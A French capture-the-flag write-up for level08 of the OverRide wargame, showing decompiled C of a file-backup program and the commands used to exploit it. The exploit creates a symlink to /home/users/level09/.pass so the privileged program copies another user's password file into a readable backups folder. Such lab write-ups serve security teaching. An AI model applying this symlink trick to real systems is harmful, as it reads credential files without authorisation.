
Dans cet exercice, on a un programme qui tente d'ouvrir un fichier qui a pour nom notre premier argument.

```bash
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 test
ERROR: Failed to open test
```

Ca se confirme avec le code decompile.
```c
FILE* fp = fopen(argv[1], "r");
```

Dans le code decompile on voit qu'il cherche a avoir acces a un dossier `backups`.
Ce dossier est present dans le repertoire.
C'est dans ce repertoire que notre programme va tenter d'ecrire une copie du fichier donne en argument.

```c
    FILE* fd = fopen("./backups/.log", "w");
    
    if (!fd)
    {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }
```

```c
    strncat(&file, argv[1], 0x63 - (~i - 1));
    int32_t fd = open(&file, 0xc1, 0x1b0);
    
    if (fd < 0)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }
```

On va donner en argument de notre programme `/home/users/level09/.pass`.
Sauf que dans le dossier backups, les dossiers home, users, level09 n'existent pas, donc on a une erreur.
Dans le repertoire backups, on a pas les droits pour creer des fichiers / dossier.
Donc on ne peut pas reproduire l'architecture de dossiers.
On va donc creer un lien symbolique qui mene vers `/home/users/level09/.pass`.
On peut lui donner le nom qu'on veut du moment qui est dans le meme repertoire que l'executable.

```bash
evel08@OverRide:~$ chmod +w ~
level08@OverRide:~$ ln -s /home/users/level09/.pass pass
level08@OverRide:~$ ls
backups  level08  pass
```

Le programme prends donc pass comme argument.
Quand il cherche a ouvrir ce fichier il pointe en realite vers `/home/users/level09/.pass`
Et quand il cherche a creer le fichier dans backups il utilise bien notre argument `pass` comme nom de fichier a ouvrir.

```bash
level08@OverRide:~$ ./level08 pass
level08@OverRide:~$ cd backups/
level08@OverRide:~/backups$ ls
pass
level08@OverRide:~/backups$ cat pass
```
